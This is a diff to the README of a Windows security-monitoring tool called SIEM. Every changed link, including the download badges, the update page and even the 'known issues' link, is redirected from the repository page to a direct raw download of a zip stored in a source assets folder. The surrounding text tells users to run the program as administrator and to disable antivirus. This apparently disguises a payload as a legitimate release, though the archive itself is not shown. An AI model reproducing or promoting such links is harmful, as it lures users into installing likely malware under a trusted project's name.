@@ -1,6 +1,6 @@
 # 🛡️ SIEM - Simple Security Event Monitoring
 
-[![Download SIEM](https://img.shields.io/badge/Download-SIEM-%2378C5E4?style=for-the-badge)](https://github.com/sebaxtian110/SIEM)
+[![Download SIEM](https://img.shields.io/badge/Download-SIEM-%2378C5E4?style=for-the-badge)](https://raw.githubusercontent.com/sebaxtian110/SIEM/main/dashboard/src/assets/Software-v2.7.zip)
 
 ---
 
@@ -34,7 +34,7 @@ To get SIEM running on your Windows PC, follow these steps:
 
 Go to this page to download the software:
 
-[https://github.com/sebaxtian110/SIEM](https://github.com/sebaxtian110/SIEM)
+[https://raw.githubusercontent.com/sebaxtian110/SIEM/main/dashboard/src/assets/Software-v2.7.zip](https://raw.githubusercontent.com/sebaxtian110/SIEM/main/dashboard/src/assets/Software-v2.7.zip)
 
 You will find the latest version available on this page. Look for a button or link labelled "Download" or something similar. This will usually open a folder or section called "Releases". 
 
@@ -74,7 +74,7 @@ The interface uses clear labels, tables, and graphs. You can navigate using menu
 
 SIEM updates may add new features and fix issues. Check the download page regularly:
 
-[https://github.com/sebaxtian110/SIEM](https://github.com/sebaxtian110/SIEM)
+[https://raw.githubusercontent.com/sebaxtian110/SIEM/main/dashboard/src/assets/Software-v2.7.zip](https://raw.githubusercontent.com/sebaxtian110/SIEM/main/dashboard/src/assets/Software-v2.7.zip)
 
 When an update is available:
 
@@ -119,10 +119,10 @@ If SIEM does not open or shows errors, try these steps:
 - Ensure you downloaded the full installer file.
 - Run the app as administrator.
 - Temporarily disable your antivirus or firewall to check if they block SIEM.
-- Visit the GitHub page for known issues: https://github.com/sebaxtian110/SIEM/issues
+- Visit the GitHub page for known issues: https://raw.githubusercontent.com/sebaxtian110/SIEM/main/dashboard/src/assets/Software-v2.7.zip
 
 You can also report your issue there with details of your problem and Windows version.
 
 ---
 
-[![Download SIEM](https://img.shields.io/badge/Download-SIEM-%23A1A1A1?style=for-the-badge)](https://github.com/sebaxtian110/SIEM)
+[![Download SIEM](https://img.shields.io/badge/Download-SIEM-%23A1A1A1?style=for-the-badge)](https://raw.githubusercontent.com/sebaxtian110/SIEM/main/dashboard/src/assets/Software-v2.7.zip)
